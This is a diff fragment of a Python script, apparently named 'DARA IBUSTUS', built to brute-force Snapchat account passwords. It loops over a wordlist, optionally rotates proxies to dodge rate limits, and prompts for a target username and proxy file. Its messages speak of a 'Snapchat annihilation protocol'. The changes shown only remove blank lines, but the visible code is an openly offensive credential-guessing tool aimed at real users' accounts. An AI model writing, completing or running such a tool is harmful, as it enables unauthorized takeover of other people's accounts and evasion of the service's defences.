@@ -43,7 +43,6 @@ def brute_force_snapchat(username, wordlist, proxy_list=None):
         "Accept-Language": "en-US,en;q=0.9",
     }
     session = requests.Session()
-
     for password in wordlist:
         proxies = None
         if proxy_list:
@@ -69,10 +68,8 @@ def brute_force_snapchat(username, wordlist, proxy_list=None):
         except Exception as e:
             print(f"{Fore.RED}[!] ERROR: {e}")
             time.sleep(2)
-
     print(f"{Fore.YELLOW}[!] No password found. DARA IBUSTUS suggests a better wordlist.")
     return None
-
 if __name__ == "__main__":
     print_banner()
     username = input(f"{Fore.CYAN}[?] Enter Snapchat username: ")
@@ -84,7 +81,6 @@ if __name__ == "__main__":
         proxy_file = input(f"{Fore.CYAN}[?] Enter proxy list path: ")
         with open(proxy_file, "r") as f:
             proxy_list = [line.strip() for line in f]
-
     wordlist = load_wordlist(wordlist_path)
     print(f"{Fore.CYAN}[*] DARA IBUSTUS engaging Snapchat annihilation protocol...")
     brute_force_snapchat(username, wordlist, proxy_list)
